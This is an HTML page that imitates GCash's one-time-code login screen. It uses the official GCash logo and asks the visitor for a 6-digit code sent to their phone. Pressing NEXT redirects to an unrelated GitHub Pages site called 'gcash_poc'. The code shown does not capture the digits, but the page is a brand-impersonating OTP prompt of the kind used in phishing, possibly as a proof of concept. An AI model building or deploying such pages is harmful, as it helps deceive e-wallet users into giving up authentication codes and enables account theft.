<!DOCTYPE html>
<html lang="en">
<head>
  <title>Authentication</title>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      box-sizing: border-box;
    }

    body {
      background-color: #ffffff;
    }

    .header {
      background-color: #0070f3;
      height: 230px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .header img {
      width: 130px;
      margin-top: 20px;
    }

    .container {
      background: white;
      max-width: 340px;
      margin: -60px auto 0;
      padding: 32px;
      border-radius: 12px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .container h2 {
      font-size: 18px;
      font-weight: 600;
      color: #000;
      margin-bottom: 10px;
    }

    .container p {
      font-size: 14px;
      color: #555;
      margin-bottom: 30px;
    }

    .code-input {
      display: flex;
      justify-content: space-between;
      max-width: 260px;
      margin: 0 auto 20px;
    }

    .code-input input {
      width: 36px;
      height: 40px;
      font-size: 20px;
      text-align: center;
      border: none;
      border-bottom: 2px solid #000;
      outline: none;
    }

    .resend-text {
      font-size: 13px;
      color: #444;
      margin-bottom: 30px;
    }

    .resend-text a {
      color: #0070f3;
      text-decoration: none;
      font-weight: 500;
    }

    .resend-text a:hover {
      text-decoration: underline;
    }

    .next-button {
      width: 100%;
      background-color: #c1d6f9;
      border: none;
      border-radius: 30px;
      padding: 14px 0;
      color: #ffffff;
      font-size: 16px;
      font-weight: bold;
      cursor: not-allowed;
      transition: background-color 0.3s;
    }

    .next-button.active {
      background-color: #0070f3;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://m.gcash.com/gcash-login-web/img/Gcash-white-new-logo.81ba859.png" alt="GCash Logo">
  </div>

  <div class="container">
    <h2>Login to link with GCash</h2>
    <p>Enter the 6-digit authentication code sent to your registered mobile number.</p>

    <div class="code-input">
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
      <input type="text" maxlength="1" inputmode="numeric" />
    </div>

    <div class="resend-text">
      Didnâ€™t get the code? <a href="#">Tap here to resend</a>
    </div>

    <button class="next-button" disabled>NEXT</button>
  </div>

  <script>
    const inputs = document.querySelectorAll(".code-input input");
    const nextButton = document.querySelector(".next-button");

    inputs.forEach((input, index) => {
      input.addEventListener("input", () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkInputs();
      });

      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "" && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    function checkInputs() {
      const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
      if (allFilled) {
        nextButton.disabled = false;
        nextButton.classList.add("active");
      } else {
        nextButton.disabled = true;
        nextButton.classList.remove("active");
      }
    }

    nextButton.addEventListener("click", () => {
      if (!nextButton.disabled) {
        window.location.href = "https://nmochea.github.io/gcash_poc/";
      }
    });
  </script>
</body>
</html>
